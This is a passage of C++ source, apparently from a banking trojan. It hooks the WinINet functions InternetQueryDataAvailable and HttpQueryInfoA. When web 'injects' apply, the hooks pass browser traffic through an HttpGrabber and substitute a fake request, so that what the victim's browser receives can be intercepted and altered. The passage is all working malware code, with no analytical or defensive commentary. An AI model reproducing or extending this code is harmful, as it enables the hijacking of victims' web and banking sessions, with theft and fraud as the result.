  return CWA(wininet, InternetReadFileExA)(handle, buffersOut, flags, context);
}

BOOL WINAPI WininetHook::hookerInternetQueryDataAvailable(HINTERNET handle, LPDWORD numberOfBytesAvailable, DWORD flags, DWORD_PTR context)
{
#if defined WDEBUG0
  WDEBUG0(WDDT_INFO, "Called");
#endif

  if(Core::isActive()/*B & & NumberOfBytesAvailable! = NULL May be NULL.*/)
  {
    int r = onInternetReadFile(&handle, NULL, 0, numberOfBytesAvailable);
    if(r != -1)return (BOOL)r;
  }
  return CWA(wininet, InternetQueryDataAvailable)(handle, numberOfBytesAvailable, flags, context);
}

BOOL WINAPI WininetHook::hookerHttpQueryInfoA(HINTERNET request, DWORD infoLevel, LPVOID buffer, LPDWORD bufferLength, LPDWORD index)
{
#if defined WDEBUG2
  WDEBUG2(WDDT_INFO, "Called, infoLevel=%u (0x%08X)", infoLevel, infoLevel);
#endif

  if(Core::isActive())
  {
    CWA(kernel32, EnterCriticalSection)(&connectionsCs);
    DWORD connectionIndex = connectionFind(request);
    if(connectionIndex != (DWORD)-1 && HttpGrabber::_isFakeData(connections[connectionIndex].injects, connections[connectionIndex].injectsCount))
    {
      request = connections[connectionIndex].fakeRequest;
    }
    CWA(kernel32, LeaveCriticalSection)(&connectionsCs);
  }

  return CWA(wininet, HttpQueryInfoA)(request, infoLevel, buffer, bufferLength, index);
}

#endif
